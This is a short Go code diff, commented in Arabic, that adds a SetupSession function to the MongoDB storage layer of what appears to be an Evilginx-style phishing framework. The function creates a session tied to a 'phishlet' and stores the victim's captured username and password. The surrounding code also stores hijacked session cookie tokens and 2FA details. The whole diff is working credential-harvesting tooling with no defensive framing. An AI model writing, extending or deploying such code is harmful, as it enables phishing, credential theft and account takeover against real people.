@@ -706,4 +706,32 @@ func (m *MongoDatabase) SetSessionCustom(sid string, name, value string) error {
 // SetSessionCookieTokens يحدث رموز الكوكيز للجلسة
 func (m *MongoDatabase) SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
 	return m.UpdateSessionCookieTokens(sid, tokens)
+}
+
+// SetupSession تقوم بإعداد جلسة كاملة مع جميع المعلومات الأساسية
+func (m *MongoDatabase) SetupSession(
+	sid string, phishlet string, username string, password string,
+	landing_url string, useragent string, remote_addr string,
+) error {
+	// إنشاء الجلسة
+	err := m.CreateSession(
+		sid, phishlet, landing_url, useragent, remote_addr,
+		"", "", // countryCode, countryName
+		"", "", "", "", "", // deviceType, browserType, browserVersion, osType, osVersion
+		"", false, "", // loginType, has2FA, type2FA
+	)
+	if err != nil {
+		return err
+	}
+
+	// تحديث اسم المستخدم وكلمة المرور
+	if err := m.SetSessionUsername(sid, username); err != nil {
+		return err
+	}
+
+	if err := m.SetSessionPassword(sid, password); err != nil {
+		return err
+	}
+
+	return nil
 } 
